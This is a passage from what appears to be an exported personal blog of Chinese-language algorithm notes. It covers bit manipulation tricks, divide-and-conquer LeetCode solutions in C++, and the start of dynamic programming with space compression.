target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] &lt; target &amp;&amp; target &lt;= nums[n - <span class="number">1</span>]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
  </entry>
  <entry>
    <title>位运算</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/CaOJ45/">从集合论到位运算，常见位运算技巧分类总结！ - 力扣（LeetCode）</a></p>
<h1>位运算</h1>
<p>常用的位运算符号包括：^按位异或，&amp;按位与，|按位或，~取反，&lt;&lt;算术左移，&gt;&gt;算术右移</p>
<table>
<thead>
<tr>
<th>x^0=x</th>
<th>x&amp;0=0</th>
<th>x|0=x</th>
</tr>
</thead>
<tbody>
<tr>
<td>x^1s=~x</td>
<td>x&amp;1s=x</td>
<td>x|1s=1</td>
</tr>
<tr>
<td>x^x=0</td>
<td>x&amp;x=x</td>
<td>x|x=x</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>作用</th>
<th>操作</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>去除n的二进制表示中最低的一位</td>
<td>n&amp;(n-1)</td>
<td>11010&amp;(11001)=11000</td>
</tr>
<tr>
<td>得到n的二进制表示中最低的一位</td>
<td>n&amp;(-n)</td>
<td>11010&amp;(00110)=00010</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>低位清0：[0:n]位清0</td>
<td>x &amp; ~(   (1&lt;&lt;(n+1))  -1  )</td>
<td></td>
</tr>
<tr>
<td>取反第n位</td>
<td>x^(1&lt;&lt;n)</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><strong>c++位运算函数</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>n的二进制表示中有多少个1</td>
<td>__builtin_popcount(n)</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="异或">异或</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>$x\oplus x=0$</p>
</li>
<li class="lvl-2">
<p>$x\oplus 0=x$</p>
</li>
<li class="lvl-2">
<p>$x\oplus y=y\oplus x$</p>
</li>
<li class="lvl-2">
<p>$x\oplus y\oplus y=x$</p>
</li>
<li class="lvl-3">
<p>$x\oplus y=z\Longrightarrow x\oplus z=y$</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>x</th>
<th>x</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>x&amp;(-x)（得到最低位的1）</td>
<td>x=16(10000)</td>
<td>10000</td>
</tr>
<tr>
<td>x&amp;(x-1)（最低位1变为0）</td>
<td>17(10001)</td>
<td>10000</td>
</tr>
</tbody>
</table>
<h1>位运算基础知识</h1>
<ol>
<li class="lvl-3">
<p>判断奇偶：</p>
<ul class="lvl-2">
<li class="lvl-6">
<p>奇：<code>(x &amp; 1) == 1</code>  ⟺  if⟺<code>(x &amp; 1) != 0</code></p>
</li>
<li class="lvl-6">
<p>偶：<code>(x &amp; 1) == 0</code>  ⟺  \iff⟺<code>(x &amp; 1) != 1</code></p>
</li>
</ul>
</li>
<li class="lvl-3">
<p>乘（或除）以 2 的幂次：</p>
<ul class="lvl-2">
<li class="lvl-6">
<p><code>x &gt;&gt; n</code>  ⟺  iff⟺<code>x / 2^n</code></p>
</li>
<li class="lvl-6">
<p><code>x &lt;&lt; n</code>  ⟺  \iff⟺<code>x * 2^n</code></p>
</li>
</ul>
</li>
<li class="lvl-3">
<p>去除最后一位 1：<code>x &amp; (x - 1)</code></p>
</li>
<li class="lvl-3">
<p>得到最后一位 1：<code>x &amp; -x</code></p>
</li>
<li class="lvl-3">
<p>判断 2 的幂次：<code>x &amp; (x - 1) == 0</code></p>
</li>
<li class="lvl-3">
<p>交换两个数：<code>a ^= b; b ^= a; a ^= b;</code></p>
</li>
<li class="lvl-3">
<p>交换符号：<code>~x + 1</code>  ⟺  \iff⟺<code>-x</code></p>
</li>
<li class="lvl-3">
<p>取绝对值：<code>(x ^ x &gt;&gt; size(x) - 1) - (x &gt;&gt; size(x) - 1)</code>  ⟺  \iff⟺<code>x &lt; 0 ? -x : x</code></p>
</li>
<li class="lvl-3">
<p>构造 n 个 1：<code>(1 &lt;&lt; n) - 1</code></p>
</li>
<li class="lvl-4">
<p>将最左边的 n 位清零：<code>x &amp; (~0 &lt;&lt; n)</code></p>
</li>
<li class="lvl-4">
<p>获取 x 的第 n 位值（0 或 1）：<code>(x &gt;&gt; n) &amp; 1</code></p>
</li>
<li class="lvl-4">
<p>获取 x 的第 n 位的幂值：<code>x &amp; (1 &lt;&lt; n)</code></p>
</li>
<li class="lvl-4">
<p>仅将第 n 位置为 1：<code>x | (1 &lt;&lt; n)</code></p>
</li>
<li class="lvl-4">
<p>仅将第 n 位置为 0：<code>x &amp; (~(1 &lt;&lt; n))</code></p>
</li>
<li class="lvl-4">
<p>将 x 最高位至第 n 位（含）清零：<code>x &amp; ((1 &lt;&lt; n) - 1)</code></p>
</li>
<li class="lvl-4">
<p>将第 n 位至第 0 位（含）清零：<code>x &amp; (~((1 &lt;&lt; (n + 1)) - 1))</code></p>
</li>
<li class="lvl-4">
<p>异或满足交换律、结合律：<code>a ^ b ^ a = b ^ (a ^ a) = b ^ 0 = b</code><a href="https://leetcode.cn/problems/insert-into-bits-lcci/solutions/2458770/jian-dan-wei-yun-suan-by-raccooncc-l7jo/?envType=study-plan-v2&amp;envId=cracking-the-coding-interview">面试题 05.01. 插入 - 力扣（LeetCode）</a></p>
</li>
</ol>
<h2 id="得到二进制数x最低位的1（lowbit）">得到二进制数x最低位的1（lowbit）</h2>
<p>x&amp;-x</p>
<blockquote>
<p>负数按照补码规则在计算机中存储，-n的二进制表示为n的二进制表示的每一位取反加1（包括符号位）</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307151956034.png" alt="image-20221018105315154"></p>
<p>二进制数最低位的1变成0</p>
<p>x=x&amp;(x-1)</p>
<p>x-=(x&amp;-x)</p>
<p>将二进制数x最低位的0变成1</p>
<blockquote>
<p>x取反的最低位1是x的最低位0</p>
<p>y=~x</p>
<p>x|=y&amp;(-y)</p>
</blockquote>
<p>x=x| (x+1)</p>
<h1>二进制特性</h1>
<blockquote>
<p>可以利用二进制和位运算输出一个数组的所有子集。假设有一个长度为n的数组，可以生成长度为n的所有二进制，1表示选取该数字，0表示不选取，可以得到$2^n$个子集。快速判断两个字符串是否含有重复字母：为每个字符串建立一个长度为26的二进制数字，每个位置表示是否存在该字母</p>
</blockquote>
<h2 id="位计数（统计1的数目）">位计数（统计1的数目）</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(x)&#123;</span><br><span class="line">    x=x&amp;(x<span class="number">-1</span>);</span><br><span class="line">    cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(x)&#123;</span><br><span class="line">    cnt+=x&amp;<span class="number">1</span>;</span><br><span class="line">    x=x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__builtin_popcount(x)</span><br></pre></td></tr></table></figure>
<h3 id="Brian-Kernighan算法">Brian Kernighan算法</h3>
<blockquote>
<p>对于任意整数 xx，令 x=x &amp; (x−1)，该运算将 x 的二进制表示的最后一个 1 变成 0。因此，对 x 重复该操作，直到 x 变成 0，则操作次数即为 x 的「一比特数」。</p>
<p>对于给定的 n，计算从 0 到 n 的每个整数的「一比特数」的时间都不会超过O(logn)，因此总时间复杂度为O(nlogn)。</p>
</blockquote>
<blockquote>
<p>c(x)表示二进制表示x中的1个数</p>
<p>c(x&amp;y)+c(x|y)=c(x)+c(y)</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305102313302.png" alt="image-20230510231250236"></p>
<p><a href="https://leetcode.cn/problems/minimum-flips-to-make-a-or-b-equal-to-c/">1318. 或运算的最小翻转次数</a></p>
<h1>题目</h1>
<h2 id="异或-2">异或</h2>
<p><a href="https://leetcode.cn/circle/discuss/sqPZwg/view/A1hGp7/">分享｜异或/XOR部分问题汇总 - 力扣（LeetCode）</a></p>
<table>
<thead>
<tr>
<th>题目</th>
<th>标签</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/description/">421. 数组中两个数的最大异或值 - 力扣（LeetCode）</a></td>
<td>字典树</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/decode-xored-array/">1720. 解码异或后的数组 - 力扣（LeetCode）</a></td>
<td>数学</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/decode-xored-permutation/description/">1734. 解码异或后的排列 - 力扣（LeetCode）</a></td>
<td>数学</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/description/">1863. 找出所有子集的异或总和再求和 - 力扣（LeetCode）</a></td>
<td>枚举子集（二进制状态枚举，递归枚举）</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/xor-queries-of-a-subarray/description/">1310. 子数组异或查询 - 力扣（LeetCode）</a></td>
<td>异或前缀和</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/maximum-xor-for-each-query/">1829. 每个查询的最大异或值 - 力扣（LeetCode）</a></td>
<td>前缀异或和、异或最大值、技巧</td>
</tr>
<tr>
<td><a href="https://leetcode.cn/problems/missing-number/">268. 丢失的数字 - 力扣（LeetCode）</a></td>
<td>异或，非常巧妙，单一的数字变种题</td>
</tr>
<tr>
<td>$$</td>
<td></td>
</tr>
</tbody>
</table>
<pre><code> \begin&#123;align&#125;
 &amp;1734题\\
&amp;(a,b,c,d,e)\\
&amp;(x,y,z,w)\\
&amp;\text&#123;有5个数字&#125;:y\oplus w=b\oplus c\oplus d\oplus e=p\\
&amp;a\oplus b\oplus c\oplus d\oplus e=1\oplus 2\oplus 3\oplus 4\oplus 5=q\\
&amp;a=q\oplus(b\oplus c\oplus d\oplus e)=q\oplus p
&amp;\end&#123;align&#125;
$$
</code></pre>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/17/%E7%AE%97%E6%B3%95/%E5%88%86%E6%B2%BB%E6%B3%95/</url>
    <content><![CDATA[<h1>分治法</h1>
<blockquote>
<p>分治(divide-conquer)，将原问题分解为容易求解的子问题，再对子问题合并，实现对原问题求解。</p>
<p>自上而下分治+记忆化搜索</p>
<p>自下而上（动态规划）</p>
</blockquote>
<h4 id="241-为运算表达式设计优先级"><a href="https://leetcode.cn/problems/different-ways-to-add-parentheses/">241. 为运算表达式设计优先级</a></h4>
<h5 id="方法一：记忆化搜索">方法一：记忆化搜索</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; operand;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; ops;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=expression.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isdigit</span>(expression[i]))&#123;</span><br><span class="line">                <span class="type">int</span> val=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(i&lt;n&amp;&amp;<span class="built_in">isdigit</span>(expression[i]))&#123;</span><br><span class="line">                    val=val*<span class="number">10</span>+expression[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                operand.<span class="built_in">push_back</span>(val);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;val&lt;&lt;endl;</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ops.<span class="built_in">push_back</span>(expression[i]);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;expression[i]&lt;&lt;endl;</span></span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">dp</span>(operand.<span class="built_in">size</span>(),vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(operand.<span class="built_in">size</span>()));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">backtrack</span>(dp,<span class="number">0</span>,dp.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">backtrack</span><span class="params">(vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; &amp;dp,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;operand[l]&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!dp[l][r].<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span> dp[l][r];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=l;i&lt;r;i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> left=<span class="built_in">backtrack</span>(dp,l,i);</span><br><span class="line">            <span class="keyword">auto</span> right=<span class="built_in">backtrack</span>(dp,i<span class="number">+1</span>,r);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> l_val:left)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> r_val:right)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(ops[i]==<span class="string">&#x27;+&#x27;</span>) dp[l][r].<span class="built_in">push_back</span>(l_val+r_val);</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(ops[i]==<span class="string">&#x27;-&#x27;</span>) dp[l][r].<span class="built_in">push_back</span>(l_val-r_val);</span><br><span class="line">                    <span class="keyword">else</span>    dp[l][r].<span class="built_in">push_back</span>(l_val*r_val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[l][r];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="932-漂亮数组"><a href="https://leetcode.cn/problems/beautiful-array/">932. 漂亮数组</a></h4>
<p>对于一个正整数 N, 我们将其<strong>等分</strong>为两部分，left 和 right， 如果 left 部分是漂亮数组，right 部分也是漂亮数组， 同时 left 部分全部是<strong>奇数</strong>，right 部分全部是<strong>偶数</strong>，那么此时 left+right 组成的数组一定也是一个漂亮数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">beautifulArray</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="built_in">divide</span>(ans,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">divide</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ans,<span class="type">int</span> left,<span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;=right)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">divide</span>(ans,left,mid);</span><br><span class="line">        <span class="built_in">divide</span>(ans,mid<span class="number">+1</span>,right);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=left;i&lt;=mid;i++)</span><br><span class="line">            ans[i]=ans[i]*<span class="number">2</span><span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=mid<span class="number">+1</span>;i&lt;=right;i++)</span><br><span class="line">            ans[i]=<span class="number">2</span>*ans[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="1763-最长的美好子字符串"><a href="https://leetcode.cn/problems/longest-nice-substring/">1763. 最长的美好子字符串</a></h4>
<blockquote>
<p>tag：切割出符合条件的子串，判断出现的大小写字符集</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> maxLen=<span class="number">0</span>,pos=<span class="number">-1</span>;</span><br><span class="line">    <span class="function">string <span class="title">longestNiceSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">check</span>(s,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> maxLen==<span class="number">0</span>?<span class="string">&quot;&quot;</span>:s.<span class="built_in">substr</span>(pos,maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(string &amp;s,<span class="type">int</span> left,<span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;=right)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> lower=<span class="number">0</span>,upper=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=left;i&lt;=right;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">islower</span>(s[i]))&#123;</span><br><span class="line">                lower|=(<span class="number">1</span>&lt;&lt;s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                upper|=(<span class="number">1</span>&lt;&lt;s[i]-<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 大写字符集和小写字符集一样</span></span><br><span class="line">        <span class="keyword">if</span>(lower==upper)&#123;</span><br><span class="line">            <span class="type">int</span> len=right-left<span class="number">+1</span>;</span><br><span class="line">            <span class="keyword">if</span>(len&gt;maxLen)&#123;</span><br><span class="line">                pos=left;</span><br><span class="line">                maxLen=len;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从左到右分割，不需要下面的  </span></span><br><span class="line">            <span class="comment">// else if(len==maxLen&amp;&amp;left&lt;pos)&#123;</span></span><br><span class="line">            <span class="comment">//     pos=left;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> valid=upper&amp;lower;</span><br><span class="line">        <span class="comment">//大写字符集和小写字符集不一样，需要分割，没有成对出现时，valid相应位置为0</span></span><br><span class="line">        <span class="type">int</span> beg=left,end=left;</span><br><span class="line">        <span class="keyword">while</span>(end&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">while</span>(end&lt;=right&amp;&amp;(valid&amp;(<span class="number">1</span>&lt;&lt;(<span class="built_in">tolower</span>(s[end])-<span class="string">&#x27;a&#x27;</span>))))</span><br><span class="line">                end++;</span><br><span class="line">            <span class="comment">// cout&lt;&lt;left&lt;&lt;&quot; &quot;&lt;&lt;right&lt;&lt;&quot; &quot;&lt;&lt;beg&lt;&lt;&quot; &quot;&lt;&lt;end&lt;&lt;endl;</span></span><br><span class="line">            <span class="built_in">check</span>(s,beg,end<span class="number">-1</span>);</span><br><span class="line">            beg=end<span class="number">+1</span>;</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="395-至少有-K-个重复字符的最长子串"><a href="https://leetcode.cn/problems/longest-substring-with-at-least-k-repeating-characters/">395. 至少有 K 个重复字符的最长子串</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestSubstring</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">check</span>(s,<span class="number">0</span>,n,k);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(string &amp;s,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> &amp;k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;=right)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=left;i&lt;right;i++)&#123;</span><br><span class="line">            cnt[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> beg=left;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> end=left;end&lt;right;end++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt[s[end]]&lt;k)&#123;</span><br><span class="line">                flag=<span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// cout&lt;&lt;beg&lt;&lt;&quot; &quot;&lt;&lt;end&lt;&lt;endl;</span></span><br><span class="line">                <span class="built_in">check</span>(s,beg,end,k);</span><br><span class="line">                beg=end<span class="number">+1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,right-left);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">check</span>(s,beg,right,k);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>动态规划</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309121141193.png" alt="image-20230912114114042"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">comb</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span> a*b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a+b</span><br><span class="line">    <span class="keyword">elif</span> a%<span class="number">10</span>==b%<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> comb(a//<span class="number">10</span>,b//<span class="number">10</span>)*<span class="number">10</span>+a%<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(comb(a//<span class="number">10</span>,b)*<span class="number">10</span>+a%<span class="number">10</span>,comb(a,b//<span class="number">10</span>)*<span class="number">10</span>+b%<span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>1 动态规划DP</h1>
<p>边界条件+转移方程</p>
<p><a href="https://oi-wiki.org/dp/interval/">DP - OI Wiki (oi-wiki.org)</a></p>
<h1>2 空间压缩</h1>
<h2 id="2-1-只与有限个变量相关">2.1 只与有限个变量相关</h2>
<h4 id="2-1-1-1-91-解码方法">2.1.1.1 <a href="https://leetcode.cn/problems/decode-ways/">91. 解码方法</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n<span class="number">+1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 当前位置不为0，可选择一个数字映射到字母</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]!=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                dp[i<span class="number">+1</span>]=dp[i];</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 选两个位置数字映射</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> val=(s[i<span class="number">-1</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span>+s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(val&lt;=<span class="number">26</span>&amp;&amp;val&gt;=<span class="number">10</span>)</span><br><span class="line">                    dp[i<span class="number">+1</span>]+=dp[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>空间优化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>,c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            c=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 当前位置不为0，可选择一个数字映射到字母</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]!=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                c=b;;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 选两个位置数字映射</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> val=(s[i<span class="number">-1</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span>+s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(val&lt;=<span class="number">26</span>&amp;&amp;val&gt;=<span class="number">10</span>)</span><br><span class="line">                    c+=a;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">tie</span>(a,b)=&#123;b,c&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="2-2-二维压缩到一维">2.2 二维压缩到一维</h2>
<h4 id="2-2-1-1-64-最小路径和">2.2.1.1 <a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h4>
